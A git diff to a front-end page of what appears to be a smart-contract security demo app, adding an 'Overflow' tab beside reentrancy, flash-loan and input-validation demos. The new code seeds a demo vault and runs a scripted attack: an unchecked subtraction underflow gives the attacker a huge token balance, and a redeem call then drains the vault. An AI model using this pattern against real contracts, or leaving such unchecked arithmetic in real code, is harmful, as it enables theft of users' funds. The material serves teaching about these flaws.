@@ -6,7 +6,7 @@ import { useSendTransaction } from "wagmi";
 import { useDeployedContractInfo, useScaffoldReadContract, useScaffoldWriteContract } from "~~/hooks/scaffold-eth";
 
 export default function AttackPage() {
-  const [tab, setTab] = useState<"reentrancy" | "flashloan" | "inputvalidation">("reentrancy");
+  const [tab, setTab] = useState<"reentrancy" | "flashloan" | "inputvalidation" | "overflow">("reentrancy");
 
   // --- Reentrancy reads ---
   const { data: bankBal, refetch: refetchBank } = useScaffoldReadContract({
@@ -42,7 +42,6 @@ export default function AttackPage() {
     watch: true,
   });
   const { data: flAttackerInfo } = useDeployedContractInfo("FlashLoanAttacker");
-  const { data: ivVictimInfo } = useDeployedContractInfo("InputValidationVictim");
 
   // --- Input validation reads ---
   const { data: ivVictimBal, refetch: refetchIvVictim } = useScaffoldReadContract({
@@ -55,6 +54,25 @@ export default function AttackPage() {
     functionName: "getBalance",
     watch: true,
   });
+  const { data: ivVictimInfo } = useDeployedContractInfo("InputValidationVictim");
+
+  // --- Overflow reads ---
+  const { data: ovVictimBal, refetch: refetchOvVictim } = useScaffoldReadContract({
+    contractName: "OverflowVictim",
+    functionName: "getBalance",
+    watch: true,
+  });
+  const { data: ovAttackerBal, refetch: refetchOvAttacker } = useScaffoldReadContract({
+    contractName: "OverflowAttacker",
+    functionName: "getBalance",
+    watch: true,
+  });
+  const { data: ovPrice } = useScaffoldReadContract({
+    contractName: "OverflowVictim",
+    functionName: "PRICE",
+  });
+  const { data: ovVictimInfo } = useDeployedContractInfo("OverflowVictim");
+  const { data: ovAttackerInfo } = useDeployedContractInfo("OverflowAttacker");
 
   // --- Reentrancy writes ---
   const { writeContractAsync: depositToBank } = useScaffoldWriteContract("VulnerableBank");
@@ -67,6 +85,10 @@ export default function AttackPage() {
   // --- Input validation writes ---
   const { writeContractAsync: seedVault } = useScaffoldWriteContract("InputValidationVictim");
   const { writeContractAsync: runInputAttack } = useScaffoldWriteContract("InputValidationAttacker");
+
+  // --- Overflow writes ---
+  const { writeContractAsync: seedOverflowVictim } = useScaffoldWriteContract("OverflowVictim");
+  const { writeContractAsync: runOverflowAttack } = useScaffoldWriteContract("OverflowAttacker");
 
   return (
     <div className="flex flex-col items-center gap-6 p-10">
@@ -81,6 +103,9 @@ export default function AttackPage() {
         </button>
         <button role="tab" className={`tab ${tab === "inputvalidation" ? "tab-active" : ""}`} onClick={() => setTab("inputvalidation")}>
           Input Validation
+        </button>
+        <button role="tab" className={`tab ${tab === "overflow" ? "tab-active" : ""}`} onClick={() => setTab("overflow")}>
+          Overflow
         </button>
       </div>
 
@@ -185,6 +210,52 @@ export default function AttackPage() {
             }}
           >
             Run Attack (0 ETH deposited)
+          </button>
+        </div>
+      )}
+
+      {tab === "overflow" && (
+        <div className="flex flex-col items-center gap-4 w-full max-w-md">
+          <div className="alert bg-base-200 text-sm">
+            <span>
+              transfer() uses an unchecked subtraction. Attacker has 0 tokens — subtracting 1 wraps to
+              type(uint256).max. Attacker then redeems just enough tokens to drain the entire vault.
+            </span>
+          </div>
+          <div className="bg-base-200 p-6 rounded-xl w-full">
+            <p><b>Vault Balance:</b> {ovVictimBal !== undefined ? formatEther(ovVictimBal) : "..."} ETH</p>
+            <p><b>Attacker Balance:</b> {ovAttackerBal !== undefined ? formatEther(ovAttackerBal) : "..."} ETH</p>
+            <p><b>Attacker Tokens:</b> 0 (before attack)</p>
+          </div>
+          <button
+            className="btn btn-primary w-full"
+            onClick={async () => {
+              await seedOverflowVictim({ functionName: "buy", value: parseEther("5") });
+              refetchOvVictim();
+            }}
+          >
+            Seed Vault (buy 50 tokens for 5 ETH)
+          </button>
+          <button
+            className="btn btn-error w-full"
+            onClick={async () => {
+              if (!ovVictimInfo?.address || !ovAttackerInfo?.address || !ovVictimBal || !ovPrice) return;
+              const drainTokens = ovVictimBal / ovPrice;
+              const triggerData = encodeFunctionData({
+                abi: [{ name: "sendTokens", type: "function", inputs: [{ name: "to", type: "address" }, { name: "amount", type: "uint256" }], outputs: [], stateMutability: "nonpayable" }],
+                functionName: "sendTokens",
+                args: ["0x0000000000000000000000000000000000000000" as Address, 1n],
+              });
+              const extractData = encodeFunctionData({
+                abi: [{ name: "redeem", type: "function", inputs: [{ name: "amount", type: "uint256" }], outputs: [], stateMutability: "nonpayable" }],
+                functionName: "redeem",
+                args: [drainTokens],
+              });
+              await runOverflowAttack({ functionName: "attack", args: [ovVictimInfo.address as Address, triggerData, extractData] });
+              setTimeout(() => { refetchOvVictim(); refetchOvAttacker(); }, 2000);
+            }}
+          >
+            Run Overflow Attack
           </button>
         </div>
       )}
